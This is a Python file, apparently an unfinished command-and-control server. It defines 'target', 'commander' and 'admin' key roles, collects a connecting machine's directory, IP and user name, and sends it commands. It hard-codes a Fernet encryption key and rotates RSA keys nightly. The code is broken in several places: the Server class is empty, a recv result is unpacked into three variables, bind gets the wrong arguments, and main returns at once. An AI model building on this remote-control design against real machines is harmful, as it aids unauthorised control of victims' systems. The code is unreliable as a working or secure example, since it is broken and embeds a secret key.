import argparse
import rsa
import socket
import threading 
import time
import utils
from cryptography.fernet import Fernet
from datetime import datetime

icon = """\
█▀█ █▀█ ▀▀▀█ 
░▄▀ ░▄▀ ░░█░ 
█▄▄ █▄▄ ░▐▌░
"""

argument_parser = argparse.ArgumentParser(prog='Server.py')
argument_parser.add_argument('-c', '--commander')
args = argument_parser.parse_args()

current_pr_keys = {
        'target': b'',
        'commander': b'',
        'server': b'',
        'admin': b''
    }

current_pub_keys = {
    'target': b'',
    'commander': b'',
    'server': b'',
    'admin': b''
}

class ClientManager:
    def __init__(self, client_socket, client_ip, server):
        self.client_socket = client_socket
        self.client_ip = client_ip
        self.server = server

    def request_handler(self, client_socket: socket.socket, message: str):
        fernet = Fernet(b'cw_0x689RpI-jtRR7oE8h_eQsKImvJapLeSbXpwF4e4=')
        str_header = ''
        encrypted_body = ''
        str_message = fernet.decrypt(message.encode('utf-8'))
        encrypted_body = str_message.split(b'IDENTIFIER')[0][10:]

    def manage_connection(self, client_socket: socket.socket, address: str):
        pwd, machine_ip, user = client_socket.recv(8192).decode()
        self.server.pwd, self.server.machine_ip, self.server.user = pwd, machine_ip, user
        self.server.send_command(client_socket)

        message = client_socket.recv(16384).decode()
        self.request_handler(client_socket, message)


class Server:
    pass


# Key publisher 
def timer(time_objective: str):
    while datetime.now().strftime('%H%M%S') != time_objective:
        time.sleep(1)
    return True 


def thread_killer(event_target: threading.Event):
    timer('000500')
    event_target.set()
    print("Ending publishing sequence...")


def key_update() -> None:
    target_keys = rsa.newkeys(1024)
    commander_keys = rsa.newkeys(1024)
    server_keys = rsa.newkeys(1024)
    admin_keys = rsa.newkeys(1024)
    current_pub_keys['target'], current_pub_keys['commander'], current_pub_keys['server'], current_pub_keys['admin'] = target_keys[0], commander_keys[0], server_keys[0], admin_keys[0]
    current_pr_keys['target'], current_pr_keys['commander'], current_pr_keys['server'], current_pr_keys['admin'] = target_keys[1], commander_keys[1], server_keys[1], admin_keys[1]


def key_publisher():
    while True:
        if datetime.now().strftime("%H%M%S") == '235959':
            old_pr_keys = current_pr_keys.copy()
            key_update()
            print("Updating keys...")
            end_publishing_sequence = threading.Event()
            thread_killer(end_publishing_sequence)

            while datetime.now().strftime("%H%M%S") != '000500' and not end_publishing_sequence.is_set():
                print("Starting publishing sequence...")
                publisher = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                publisher.bind(socket.gethostname(), 12012)
                publisher.listen()
                distant_socket, distant_ip = publisher.accept()
                old_pr_key = distant_socket.recv(1024)
                if old_pr_key not in list(old_pr_keys.keys()):
                    distant_socket.send(b'wrong key')


def main():
    key_publisher_thread = threading.Thread(target=key_publisher)
    key_publisher_thread.start()
    print(current_pr_keys)
    while datetime.now().strftime("%H%M%S") != '000000':
        return 
    print(current_pr_keys)

if __name__ == '__main__':
    main()
